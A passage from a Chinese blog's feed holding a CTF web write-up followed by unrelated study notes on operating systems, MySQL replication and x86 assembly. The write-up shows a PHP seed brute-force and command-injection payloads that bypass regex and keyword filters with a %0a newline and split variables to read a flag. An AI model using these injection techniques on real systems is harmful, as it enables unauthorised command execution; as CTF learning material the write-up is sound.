class="line">&#125;</div><div class="line">for($i=0;$i&lt;999999999;$i++)</div><div class="line">&#123;</div><div class="line">    $_SESSION[&apos;seed&apos;] = $i;</div><div class="line">    if(youhuima() == &quot;tmqoTcEJIQ5lrsF&quot;)</div><div class="line">    &#123;</div><div class="line">        echo $i,&quot;&lt;/br&gt;&quot;;</div><div class="line"> echo youhuima();</div><div class="line">        exit();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">//echo &quot;tmqoTcEJIQ5lrsF&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>也就几分钟，就爆破出来了。可能是运气好<br><img src="http://img.cdn.cuittk.cn/61wmtb9k7mcdtjvv219h52nle4.png" alt=""><br>得到随机种子15252003，<br>设置$_SESSION[‘seed’]为15252003，得到优惠码tmqoTcEJsk5PJsFZfOqDZXbd<br>已经得到的session<br>PHPSESSID=42i3mgn649nj6vsvtc05h2oej6<br>进入下一个support<br><a href="http://123.207.84.13:22333/exec.php" target="_blank" rel="external">http://123.207.84.13:22333/exec.php</a><br><img src="http://img.cdn.cuittk.cn/yw0f1aa8jzizrlborax2wrzk0r.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</div></pre></td></tr></table></figure></p><p>虽然有了开头^和结尾$，但是有/m参数，/m表示开启多行匹配模式<br>使用%0a绕过<br>1.1.1.1%0awhoami<br>不知道为什么在输入框输入不行，要用参数提交<br>POST：ip=1.1.1.1%0awhoami<br><img src="http://img.cdn.cuittk.cn/9nwzq7mw50o1oa0ipnw4aylplo.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</div></pre></td></tr></table></figure></p><p>过滤了cat flag关键字<br>使用变量绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=c;b=at;c=fl;d=ag;$a$b $c$d</div><div class="line">ip=127.0.0.1%0acd ../../../;ls -l;a=c;b=at;c=fl;d=ag;$a$b $c$d</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/frk88q8abhntgwkl6yjaey8vkj.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;用优惠码-买个-X&quot;&gt;&lt;a href=&quot;#用优惠码-买个-X&quot; class=&quot;headerlink&quot; title=&quot;用优惠码  买个 X ?&quot;&gt;&lt;/a&gt;用优惠码  买个 X ?&lt;/h2&gt;&lt;p&gt;flag在/flag中&lt;br&gt;URL &lt;a href=&quot;http://1
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>操作系统复习</title>
    <link href="http://www.cuittk.cn/2018/12/10/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/"/>
    <id>http://www.cuittk.cn/2018/12/10/操作系统复习/</id>
    <published>2018-12-10T14:11:06.053Z</published>
    <updated>2018-12-11T12:53:07.144Z</updated>
    
    <content type="html"><![CDATA[<h2 id="操作系统复习"><a href="#操作系统复习" class="headerlink" title="操作系统复习"></a>操作系统复习</h2><h3 id="第一章-操作系统引论"><a href="#第一章-操作系统引论" class="headerlink" title="第一章 操作系统引论"></a>第一章 操作系统引论</h3><h4 id="操作系统的作用"><a href="#操作系统的作用" class="headerlink" title="操作系统的作用"></a>操作系统的作用</h4><p>1.OS作为用户与计算机硬件系统之间的接口<br>2.OS作为计算机系统资源的管理者</p><h4 id="操作系统的发展过程"><a href="#操作系统的发展过程" class="headerlink" title="操作系统的发展过程"></a>操作系统的发展过程</h4><h5 id="无操作系统的计算机系统"><a href="#无操作系统的计算机系统" class="headerlink" title="无操作系统的计算机系统"></a>无操作系统的计算机系统</h5><p>人工操作方式<br>脱机输入/输出方式</p><h5 id="单道批处理系统"><a href="#单道批处理系统" class="headerlink" title="单道批处理系统"></a>单道批处理系统</h5><p>单道批处理系统的特征<br>(1) 自动性<br>(2) 顺序性<br>(3) 单道性</p><h5 id="多道批处理系统"><a href="#多道批处理系统" class="headerlink" title="多道批处理系统"></a>多道批处理系统</h5><h6 id="1-多道程序设计的基本概念"><a href="#1-多道程序设计的基本概念" class="headerlink" title="1.多道程序设计的基本概念"></a>1.多道程序设计的基本概念</h6><p>过程：<br>作业先存放在外存上并排成一个队列，称为“后备队列”；然后，由作业调度程序按一定的算法从后备队列中选择若干个作业调入内存，使它们共享CPU和系统中的各种资源。<br>优点：<br>提高CPU的利用率<br>提高内存和I/O设备利用率<br>增加系统吞吐量</p><h6 id="2-多道批处理系统的特点"><a href="#2-多道批处理系统的特点" class="headerlink" title="2.多道批处理系统的特点"></a>2.多道批处理系统的特点</h6><p>多道：<br>多道指某个作业占用CPU，若由于某种原因暂时不用CPU，则系统让第二个作业占用CPU。<br>成批处理：<br> 用户自己不能干预自己作业的运行，一旦发现作业错误不能及时改正，并延长开发软件时间，所以适用于成熟的程序。<br> 无序性。<br> 调度性。</p><h6 id="3-多道批处理系统的优缺点"><a href="#3-多道批处理系统的优缺点" class="headerlink" title="3.多道批处理系统的优缺点"></a>3.多道批处理系统的优缺点</h6><p>(1) 资源利用率高<br>(2) 系统吞吐量大<br>(3) 可提高内存和I/O设备利用率<br>(4) 平均周转时间长<br>(5) 无交互能力。</p><font color="red">适合大型科学计算、数据处理。</font><h6 id="4-多道批处理需要解决的问题"><a href="#4-多道批处理需要解决的问题" class="headerlink" title="4.多道批处理需要解决的问题"></a>4.多道批处理需要解决的问题</h6><p> (1) 处理机管理问题。<br>(2) 内存管理问题。<br>(3) I/O设备管理问题。<br>(4) 文件管理问题。<br>(5) 作业管理问题。 </p><h5 id="分时系统-Time-Sharing-System"><a href="#分时系统-Time-Sharing-System" class="headerlink" title="分时系统(Time-Sharing System)"></a>分时系统(Time-Sharing System)</h5><h6 id="1-分时系统的产生"><a href="#1-分时系统的产生" class="headerlink" title="1.分时系统的产生"></a>1.分时系统的产生</h6><p>满足用户如下需求：<br>(1) 人—机交互<br>(2) 共享主机<br>(3) 便于用户上机<br><img src="http://img.cdn.cuittk.cn/wn5puco1om706vq32od7l56gmy.png" alt=""></p><h6 id="2-分时系统的思想"><a href="#2-分时系统的思想" class="headerlink" title="2.分时系统的思想"></a>2.分时系统的思想</h6><p>采用时间片轮的方法，同时为许多终端用户服务，对每个用户能保证足够快的响应时间，并提供交互会话的功能。<br>时间片：将CPU的时间划分成若干个片段,称为时间片，操作系统以时间片为单位,轮流为每个终端用户服务<br>设计目标：对用户的请求及时响应，并在可能条件下尽量提高系统资源的利用率。<br>适合办公自动化、教学及事务处理等要求人机会话的场合。</p><h6 id="3-分时操作系统工作方式"><a href="#3-分时操作系统工作方式" class="headerlink" title="3.分时操作系统工作方式"></a>3.分时操作系统工作方式</h6><p>一台主机连接了若干个终端<br>每个终端有一个用户在使用<br>交互式的向系统提出命令请求<br>系统接受每个用户的命令<br>采用时间片轮转方式处理服务请求<br>并通过交互方式在终端上向用户显示结果<br>用户根据上步结果发出下道命令</p><h6 id="4-分时系统实现中的关键问题"><a href="#4-分时系统实现中的关键问题" class="headerlink" title="4.分时系统实现中的关键问题"></a>4.分时系统实现中的关键问题</h6><p>(1) 及时接收。<br>(2) 及时处理。</p><h6 id="5-分时操作系统特点"><a href="#5-分时操作系统特点" class="headerlink" title="5.分时操作系统特点"></a>5.分时操作系统特点</h6><p>多路性<br>交互性<br>独立性<br>及时性</p><h6 id="6-影响响应时间的因素"><a href="#6-影响响应时间的因素" class="headerlink" title="6.影响响应时间的因素"></a>6.影响响应时间的因素</h6><p>终端数目多少<br>调度算法（时间片的选取）<br>信息交换量和信息交换速度<br>机器处理能力<br>请求服务的时间长短及服务请求的分布</p><h5 id="实时系统-Real-Time-System"><a href="#实时系统-Real-Time-System" class="headerlink" title="实时系统(Real-Time System)"></a>实时系统(Real-Time System)</h5><p>“实时”，是表示“及时”，而实时系统(Real-Time System)是指系统能及时响应外部事件的请求，在规定的时间内完成对该事件的处理，并控制所有实时任务协调一致地运行。<br>特点：及时性要求高，系统可靠性高。</p><h6 id="1-实时操作系统的分类"><a href="#1-实时操作系统的分类" class="headerlink" title="1.实时操作系统的分类"></a>1.实时操作系统的分类</h6><p>实时控制系统：通常是指以计算机为中心的生产过程控制系统，又称计算机控制系统。<br>如：钢铁冶炼和钢板轧制的自动控制、炼油、化工生产过程的自动控制,军事控制等。<br>实时信息处理系统：计算机及时接收从远程终端发来的服务请求，根据用户提出的问题对信息进行检索和处理，并在很短时间内对用户做出正确回答。<br>例如：银行，机票订购系统、股市行情实时信息处理系统等</p><h6 id="2-实时任务"><a href="#2-实时任务" class="headerlink" title="2.实时任务"></a>2.实时任务</h6><p>按任务执行时是否呈现周期性可分为：<br>周期性实时任务<br>非周期性实时任务<br>根据对截止时间的要求可分为：<br>硬实时任务<br>软实时任务 </p><h6 id="3-实时系统与分时系统特征的比较"><a href="#3-实时系统与分时系统特征的比较" class="headerlink" title="3.实时系统与分时系统特征的比较"></a><font color="red">3.实时系统与分时系统特征的比较</font></h6><p>（1）多路性<br>（2）独立性<br>（3）及时性<br>（4）交互性<br>（5）可靠性</p><h5 id="微机操作系统的发展"><a href="#微机操作系统的发展" class="headerlink" title="微机操作系统的发展"></a>微机操作系统的发展</h5><p>单用户单任务： CP/M 8位操作系统、MS-DOS 16位操作系统<br>单用户多任务操作系统: windows 系列<br>多用户多任务操作系统: unix  linux</p><h4 id="操作系统的基本特性"><a href="#操作系统的基本特性" class="headerlink" title="操作系统的基本特性"></a>操作系统的基本特性</h4><h5 id="操作系统的定义"><a href="#操作系统的定义" class="headerlink" title="操作系统的定义"></a>操作系统的定义</h5><p>操作系统（Operating System，简称OS）是控制和管理计算机硬件和软件资源的一个系统软件,是一些程序模块的集合。<br> 它能以尽量有效、合理的方式组织和管理计算机的软硬件资源，合理的组织计算机的工作流程，控制程序的执行并向用户提供各种服务功能，使得用户能够灵活、方便、有效的使用计算机，使整个计算机系统能高效地运行。<br> 它是系统软件的核心，是计算机处理时必不可少的非常重要的软件。</p><h5 id="操作系统的特征"><a href="#操作系统的特征" class="headerlink" title="操作系统的特征"></a>操作系统的特征</h5><p>并发性<br>共享性<br>虚拟性<br>异步性</p><h6 id="并发性"><a href="#并发性" class="headerlink" title="并发性"></a>并发性</h6><p>并行性是指两个或多个事件在同一时间发生。<br>并发性是指两个或多个事件在同一时间间隔内发生。 (与并发相似，但多指硬件支持）<br>进程、线程</p><h6 id="共享性"><a href="#共享性" class="headerlink" title="共享性"></a>共享性</h6><p>互斥共享方式：打印机、磁带机<br>同时访问方式： 磁盘、文件</p><h6 id="虚拟性"><a href="#虚拟性" class="headerlink" title="虚拟性"></a>虚拟性</h6><p>时分复用技术：分时使用<br>(1)虚拟处理机技术<br>(2)虚拟设备技术：如共享打印机<br>空分复用技术<br>(1)虚拟磁盘技术<br>(2)虚拟存储器技术</p><h5 id="操作系统的主要功能"><a href="#操作系统的主要功能" class="headerlink" title="操作系统的主要功能"></a>操作系统的主要功能</h5><p>从资源管理观点看，操作系统具有五大功能：<br> 处理机管理<br> 存储器管理<br> 设备管理<br> 文件管理<br> 作业管理</p><h3 id="第二章-进程的描述与控制"><a href="#第二章-进程的描述与控制" class="headerlink" title="第二章 进程的描述与控制"></a>第二章 进程的描述与控制</h3><h4 id="进程的定义和特征"><a href="#进程的定义和特征" class="headerlink" title="进程的定义和特征"></a>进程的定义和特征</h4><p>进程的定义：<br>进程是程序在一个数据集合上的运行过程，是系统进行资源分配和调度的一个独立的基本单位。<br>进程实体组成：程序段、数据段、PCB（进程控制块）<br>进程的特征：<br>(1)动态性：进程是程序的一次运行过程，有生命周期。<br>(2)并发性<br>(3)独立性：进程是一个能独立运行的基本单位，同时也是系统分配资源和调度的独立单位<br>(4)异步性:进程按各自独立的、 不可预知的速度向前推进.</p><h4 id="进程的基本状态及转换"><a href="#进程的基本状态及转换" class="headerlink" title="进程的基本状态及转换"></a>进程的基本状态及转换</h4><h5 id="1-进程的三种基本状态"><a href="#1-进程的三种基本状态" class="headerlink" title="1.进程的三种基本状态"></a>1.进程的三种基本状态</h5><p>就绪状态（Ready）：得到了除CPU以外的所有必要资源。<br> 执行状态（Running）：已获得处理机，程序正在被执行。<br> 阻塞状态（Blocked）：因等待某事件发生而暂时无法继续执行，从而放弃处理机，使程序执行处于暂停状态。</p><h5 id="2-三种基本状态的转换"><a href="#2-三种基本状态的转换" class="headerlink" title="2.三种基本状态的转换"></a>2.三种基本状态的转换</h5><p><img src="http://img.cdn.cuittk.cn/p6j8vv5j4ko3wrqwjikda9v3u9.png" alt=""></p><h5 id="3-创建状态和终止状态"><a href="#3-创建状态和终止状态" class="headerlink" title="3.创建状态和终止状态"></a>3.创建状态和终止状态</h5><p><img src="http://img.cdn.cuittk.cn/ulsdlsniulv50aqe059xrfr1f9.png" alt=""></p><h4 id="挂起操作和进程状态的转换"><a href="#挂起操作和进程状态的转换" class="headerlink" title="挂起操作和进程状态的转换"></a>挂起操作和进程状态的转换</h4><p><img src="http://img.cdn.cuittk.cn/g6r67co2vgqfr76c5bc2ekzczb.png" alt=""></p><h4 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h4><h5 id="进程控制块的作用"><a href="#进程控制块的作用" class="headerlink" title="进程控制块的作用"></a>进程控制块的作用</h5><p>概念<br>用于描述进程情况及控制进程运行所需要的全部信息<br>作用<br>通过PCB，使得原来不能独立运行的程序（数据），成为一个可以独立运行的基本单位，一个能够并发执行的进程。进程控制块是进程存在的唯一标志。<br>进程控制块中的信息<br>进程标识符：唯一地标识一个进程。<br>处理机状态：保留进程存放在处理器中的各种信息，主要由处理器内的各个寄存器的内容组成。<br> 进程调度信息：进程状态、进程优秀级、阻塞原因等等。<br> 进程控制信息：程序和数据的地址、进程同步和通信机制、资源清单、链接指针       </p><h4 id="操作系统内核"><a href="#操作系统内核" class="headerlink" title="操作系统内核"></a>操作系统内核</h4><p>进程控制是对系统中所有进程从产生、存在到消亡的全过程实行有效的管理和控制。进程控制一般是由操作系统的内核来实现，内核在执行操作时，往往是通过执行各种原语操作来实现的<br>内核：加在硬件上的第一层软件，通过执行各种原语操作来实现各种控制和管理功能，具有创建、撤消、进程通信、资源管理的功能。<br>内核的基本功能<br> 支撑功能：中断处理、时钟管理、原语操作<br> 资源管理功能：进程管理、存贮管理、设备管理<br> 原语：是由若干条机器指令所构成，用以完成特定功能的一段程序 。原语在执行期间是不可分割的或不可中断的。<br> 创建原语、撤消原语、阻塞原语、唤醒原语</p><h4 id="临界资源"><a href="#临界资源" class="headerlink" title="临界资源"></a>临界资源</h4><p> 一次仅允许一个进程使用的资源，如打印机、变量。<br>生产者-消费者（producer-consumer）问题是一个著名的进程同步问题。<br>要令其互斥地访问变量counter</p><h4 id="临界区-critical-section"><a href="#临界区-critical-section" class="headerlink" title="临界区(critical section)"></a>临界区(critical section)</h4><p>临界区是每个进程中访问临界资源的那段代码。<br>while(True)<br>{<br>    进入区<br>    临界区<br>    退出区<br>    剩余区<br>}</p><h4 id="同步机制应遵循的规则"><a href="#同步机制应遵循的规则" class="headerlink" title="同步机制应遵循的规则"></a>同步机制应遵循的规则</h4><p>(1) 空闲让进。<br>(2) 忙则等待。<br>(3) 有限等待。<br>(4) 让权等待</p><h4 id="记录型信号量、利用记录型信号量解决生产者-消费者问题"><a href="#记录型信号量、利用记录型信号量解决生产者-消费者问题" class="headerlink" title="记录型信号量、利用记录型信号量解决生产者-消费者问题"></a>记录型信号量、利用记录型信号量解决生产者-消费者问题</h4><h4 id="线程的基本概念"><a href="#线程的基本概念" class="headerlink" title="线程的基本概念"></a>线程的基本概念</h4><p>线程与进程的比较<br>调       度： 进程不再是调度的基本单位。<br>并  发  性： 进程之间可以并发，线程之间也可以并发执行。<br>拥有资源： 线程几乎不占资源，同一进程的线程共享进程的资源。<br>独立性： 同一进程中的不同线程之间的独立性要低很多。<br>系统开销：线程的创建、撤消与切换的系统开销小的多。<br>支持多处理机系统</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;操作系统复习&quot;&gt;&lt;a href=&quot;#操作系统复习&quot; class=&quot;headerlink&quot; title=&quot;操作系统复习&quot;&gt;&lt;/a&gt;操作系统复习&lt;/h2&gt;&lt;h3 id=&quot;第一章-操作系统引论&quot;&gt;&lt;a href=&quot;#第一章-操作系统引论&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="课程" scheme="http://www.cuittk.cn/categories/%E8%AF%BE%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>mysql的主从服务器配置(linux主,windows从)</title>
    <link href="http://www.cuittk.cn/2018/12/07/mysql%E7%9A%84%E4%B8%BB%E4%BB%8E%E9%85%8D%E7%BD%AE(linux%E4%B8%BB,windows%E4%BB%8E)/"/>
    <id>http://www.cuittk.cn/2018/12/07/mysql的主从配置(linux主,windows从)/</id>
    <published>2018-12-07T12:49:00.179Z</published>
    <updated>2018-12-07T14:26:24.910Z</updated>
    
    <content type="html"><![CDATA[<p>由于平台原因，要实时备份mysql的数据，使用主从服务器。万一主服务器的mysql崩溃，导致数据丢失，可以迅速切换到从服务器的mysql。</p><h2 id="mysql的主从服务器配置-linux主-windows从"><a href="#mysql的主从服务器配置-linux主-windows从" class="headerlink" title="mysql的主从服务器配置(linux主,windows从)"></a>mysql的主从服务器配置(linux主,windows从)</h2><h3 id="MySQL主从介绍"><a href="#MySQL主从介绍" class="headerlink" title="MySQL主从介绍"></a>MySQL主从介绍</h3><p>MySQL主从又叫做Replication、AB复制。<br>MySQL主从是基于binlog的，主上须开启binlog才能进行主从。<br>MySQL的二进制日志可以说是MySQL最重要的日志了，它记录了所有的DDL和DML(除了数据查询语句)语句，以事件形式记录，还包含语句所执行的消耗的时间，MySQL的二进制日志是事务安全型的。</p><h3 id="mysql主从服务器环境介绍："><a href="#mysql主从服务器环境介绍：" class="headerlink" title="mysql主从服务器环境介绍："></a>mysql主从服务器环境介绍：</h3><p>主服务器系统：ubuntu<br>主服务器ip地址:192.168.59.129<br>从服务器系统：win7<br>从服务器ip地址:192.168.59.131</p><h3 id="配置Master主服务器"><a href="#配置Master主服务器" class="headerlink" title="配置Master主服务器"></a>配置Master主服务器</h3><h4 id="创建用户，指定权限，指定host，设置密码"><a href="#创建用户，指定权限，指定host，设置密码" class="headerlink" title="创建用户，指定权限，指定host，设置密码"></a>创建用户，指定权限，指定host，设置密码</h4><p>在主服务器的mysql中创建一个用户’repl’,并允许其他Slave服务器可以通过远程访问Master<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt;create user repl; //创建新用户</div><div class="line">//repl用户必须具有REPLICATION SLAVE权限，除此之外没有必要添加不必要的权限，密码为mysql。说明一下192.168.0.%，这个配置是指明repl用户所在服务器，这里%是通配符，表示192.168.0.0-192.168.0.255的Server都可以以repl用户登陆主服务器。当然你也可以指定固定Ip。</div><div class="line">mysql&gt;GRANT REPLICATION SLAVE ON *.* TO &apos;repl&apos;@&apos;192.168.0.%&apos; IDENTIFIED BY &apos;mysql&apos;;</div></pre></td></tr></table></figure></p><h4 id="主服务器启动二进制日志log-bin，指定同步的数据库"><a href="#主服务器启动二进制日志log-bin，指定同步的数据库" class="headerlink" title="主服务器启动二进制日志log-bin，指定同步的数据库"></a>主服务器启动二进制日志log-bin，指定同步的数据库</h4><p>编辑my.cnf，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi /etc/my.cnf或者vi /etc/mysql/my.cnf</div></pre></td></tr></table></figure></p><p>在[mysqld]的下面添加如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">server-id = 1 #给数据库服务的唯一标识,必须</div><div class="line">log-bin=master-bin</div><div class="line">log-bin-index=master-bin.index</div><div class="line">binlog-do-db=mytest #指定同步的数据库</div><div class="line">Binlog-ignore-db=mysql #指定忽略的数据库，同上者只需存在一个类型即可。</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/smljzgr5v9dlspyn646l74bh2g.png" alt=""></p><h4 id="重启mysql服务"><a href="#重启mysql服务" class="headerlink" title="重启mysql服务"></a>重启mysql服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service mysql restart 或者</div><div class="line">sudo /etc/init.d/mysql restart</div></pre></td></tr></table></figure><h4 id="查看master主服务器状态"><a href="#查看master主服务器状态" class="headerlink" title="查看master主服务器状态"></a>查看master主服务器状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show master status\G</div></pre></td></tr></table></figure><p><img src="http://img.cdn.cuittk.cn/5ku2pvklelbzw1gm42bfp9e9af.png" alt=""></p><h3 id="配置slave从服务器"><a href="#配置slave从服务器" class="headerlink" title="配置slave从服务器"></a>配置slave从服务器</h3><h4 id="windows上编辑mysql配置文件my-ini"><a href="#windows上编辑mysql配置文件my-ini" class="headerlink" title="windows上编辑mysql配置文件my.ini"></a>windows上编辑mysql配置文件my.ini</h4><p>在【mysqld】选项的下面添加如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">server-id=2 #服务器slave的标志号</div><div class="line">relay-log-index=slave-relay-bin.index</div><div class="line">relay-log=slave-relay-bin #缓冲日志，存储从master转过来的bin-log</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/261y9p7yke2ymygduax1wfpmvl.png" alt=""></p><h4 id="从服务器上配置连接信息"><a href="#从服务器上配置连接信息" class="headerlink" title="从服务器上配置连接信息"></a>从服务器上配置连接信息</h4><p>进入从服务器的mysql，先停止slave<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">slave stop;</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt;change master to master_host=&apos;192.168.59.129&apos;, #Master主服务器ip</div><div class="line">master_port=3306,</div><div class="line">master_user=&apos;repl&apos;,</div><div class="line">master_password=&apos;mysql&apos;, </div><div class="line">master_log_file=&apos;master-bin.000005&apos;, #主服务器状态图中的File值</div><div class="line">master_log_pos=1263; #主服务器状态图中的Position值</div></pre></td></tr></table></figure><p><img src="http://img.cdn.cuittk.cn/0urhyv2c5wmix8vuetekoy5pn.png" alt=""></p><h4 id="查看slave从服务器状态"><a href="#查看slave从服务器状态" class="headerlink" title="查看slave从服务器状态"></a>查看slave从服务器状态</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show slave status\G</div></pre></td></tr></table></figure><p><img src="http://img.cdn.cuittk.cn/un1a482nag36jfgpd33g2ay4g3.png" alt=""><br>看其中的slave_io_running和slave_sql_running的状态是否yes，不是的话则出错了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此mysql主从服务器就搭建好了。注意，搭建之前，最后先让两个数据库的信息相同。搭建完成后，主服务器的除了查询之外的所以操作，从服务器都会做一遍。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;由于平台原因，要实时备份mysql的数据，使用主从服务器。万一主服务器的mysql崩溃，导致数据丢失，可以迅速切换到从服务器的mysql。&lt;/p&gt;
&lt;h2 id=&quot;mysql的主从服务器配置-linux主-windows从&quot;&gt;&lt;a href=&quot;#mysql的主从服务器配置-
      
    
    </summary>
    
      <category term="开发" scheme="http://www.cuittk.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编语言复习</title>
    <link href="http://www.cuittk.cn/2018/12/02/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%A4%8D%E4%B9%A0/"/>
    <id>http://www.cuittk.cn/2018/12/02/汇编语言复习/</id>
    <published>2018-12-02T08:04:28.075Z</published>
    <updated>2018-12-05T08:02:18.841Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第二章-x86处理器架构"><a href="#第二章-x86处理器架构" class="headerlink" title="第二章 x86处理器架构"></a>第二章 x86处理器架构</h3><h4 id="2-1-1-微机的基本结构"><a href="#2-1-1-微机的基本结构" class="headerlink" title="2.1.1 微机的基本结构"></a>2.1.1 微机的基本结构</h4><p>图2-1描述了微机的基本结构：<br>中央处理器 CPU<br>内存存储单元<br>输入/输出设备<br>通过三大总线连接起来<br><img src="http://img.cdn.cuittk.cn/0cw1qxrlj9vn290eimm24mstf0.png" alt=""><br>中央处理器CPU包括<br>数量有限的称作寄存器的存储单元<br>一个高频时钟<br>用于CPU内部操作和其他系统部件之间的同步<br>一个控制单元(CU)<br>协调执行机器指令时各个步骤的次序<br>一个算术逻辑单元(ALU)<br>执行加法等算术逻辑运算<br>CPU通过主板插槽的引脚同计算机的其他部分相连接</p><p>由于内存与CPU速度相差巨大，目前一般是采取缓存的方式来提高速度。</p><h4 id="2-2-1-操作模式"><a href="#2-2-1-操作模式" class="headerlink" title="2.2.1 操作模式"></a>2.2.1 操作模式</h4><p>IA-32处理器有3种基本的操作模式<br>保护模式，是基本模式<br>实地址模式<br>虚拟8086模式，是保护模式的一个特例。在保护模式下执行实地址模式的软件。<br>实模式只能访问地址在1M以下的内存称为常规内存，我们把地址在1M 以上的内存称为扩展内存。<br>在保护模式下，全部32条地址线有效，可寻址高达4G字节的物理地址空间;<br>实地址模式下，只用到20根地址线，最大地址访问量是1M。<br>在虚拟8086模式下，一个系统中可以运行多个虚拟的8086模式程序，每个程序拥有独立的1M地址空间。</p><h5 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h5><p>指令分成不同的级别，程序也分成不同的级别，如系统级程序和应用级程序，应用级程序能执行的指令要少<br>不同程序间内存独立，一个程序不能去访问其他程序的内存<br>现代的windows，Linux等操作系统，都把CPU设置在保护模式下工作<br>是从286开始引入保护模式的概念，在之前的8086不具有这种工作模式</p><h5 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h5><p>即是8086的工作模式<br>由于IA-32的向前兼容特性，可以理解成在整个IA-32系列CPU中都包含了8086这个CPU内核<br>在CPU加电时，CPU工作在实模式。平时机器启动过程中，开始的开机自检阶段，CPU工作在实模式，在windows操作系统载入过程中的某一步，CPU操作模式被置成保护模式，然后就一直工作在保护模式<br>实模式无指令级别概念，内存也不独立，不同程序间可以相互访问对方的内存，使得系统可能不稳定。<br>在DOS操作系统中，CPU工作在实模式</p><h4 id="定义数据"><a href="#定义数据" class="headerlink" title="定义数据"></a>定义数据</h4><p>v1 byte ‘A’;<br>v2 sbyte -128;<br>v3 byte ‘Good’;=v4 byte ‘G’,’o’,’o’,’d’;</p><p>w1 word 65535;=w2 dw 65535;</p><p>w1 dword 1234567h;<br>w2 sdword -2147483648;<br>BYTE=1字节=8位<br>WORD=2字节=16位<br>DWORD=4字节=32位</p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>CPU内部的存储单元，访问速度比内存快得多<br><img src="http://img.cdn.cuittk.cn/06jvnn9j0mzyf4reaiwbjn6rbe.png" alt=""></p><h5 id="8个通用寄存器"><a href="#8个通用寄存器" class="headerlink" title="8个通用寄存器"></a>8个通用寄存器</h5><p>32位|    16位        高8位        低8位<br>EAX AX AH AL    （乘法除法默认使用）<br>EBX BX BH BL    （基址寄存器，常用于地址索引）<br>ECX CX CH CL    （自动使用做为循环计数器）<br>EDX DX DH DL     （数据寄存器，常用于数据传递）<br>EBP        （使用EBP指向堆栈上的函数参数和局部变量）<br>ESP        （扩展堆栈指针寄存器）<br>ESI、EDI        （高速内存数据传递指令使用）</p><h5 id="6个16位的段地址"><a href="#6个16位的段地址" class="headerlink" title="6个16位的段地址"></a>6个16位的段地址</h5><h3 id="第4章-数据传送、寻址和算术运算"><a href="#第4章-数据传送、寻址和算术运算" class="headerlink" title="第4章 数据传送、寻址和算术运算"></a>第4章 数据传送、寻址和算术运算</h3><h4 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h4><h5 id="4-1-2-操作数类型"><a href="#4-1-2-操作数类型" class="headerlink" title="4.1.2 操作数类型"></a>4.1.2 操作数类型</h5><p>三类操作数：立即操作数、寄存器操作数、内存操作数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第二章-x86处理器架构&quot;&gt;&lt;a href=&quot;#第二章-x86处理器架构&quot; class=&quot;headerlink&quot; title=&quot;第二章 x86处理器架构&quot;&gt;&lt;/a&gt;第二章 x86处理器架构&lt;/h3&gt;&lt;h4 id=&quot;2-1-1-微机的基本结构&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>第一届安洵杯writeup</title>
